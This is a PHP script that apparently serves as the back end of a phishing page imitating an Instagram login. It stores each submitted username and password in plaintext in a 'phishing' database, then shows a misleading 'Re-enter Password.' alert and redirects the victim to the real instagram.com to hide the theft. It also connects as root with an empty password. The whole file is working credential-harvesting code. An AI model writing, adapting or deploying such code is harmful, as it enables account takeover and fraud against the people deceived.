<?php
session_start();

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $submittedUsername = $_POST["username"];
    $submittedPassword = $_POST["password"];

    // Perform validation on the submittedUsername and submittedPassword

    // ... (Implement your validation logic here)

    $servername = "localhost";
    $dbUsername = "root";
    $dbPassword = "";
    $dbname = "phishing";

    $conn = mysqli_connect($servername, $dbUsername, $dbPassword, $dbname);

    if (!$conn) {
        die("Connection failed: " . mysqli_connect_error());
    }

    // Use prepared statements to prevent SQL injection
    $sql = "INSERT INTO pass (username, password) VALUES (?, ?)";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("ss", $submittedUsername, $submittedPassword);

    if ($stmt->execute()) {
        // Success! Redirect to the desired page or display a success message.
        echo "<script>alert('Re-enter Password.');window.location.href='https://www.instagram.com/';</script>";
        exit();
    } else {
        // Display an error message if the execution fails.
        echo "<script>alert('Error in Login into your account: " . $stmt->error . "');window.location.href='index.html';</script>";
        exit();
    }

    $stmt->close();
    $conn->close();
}
?>
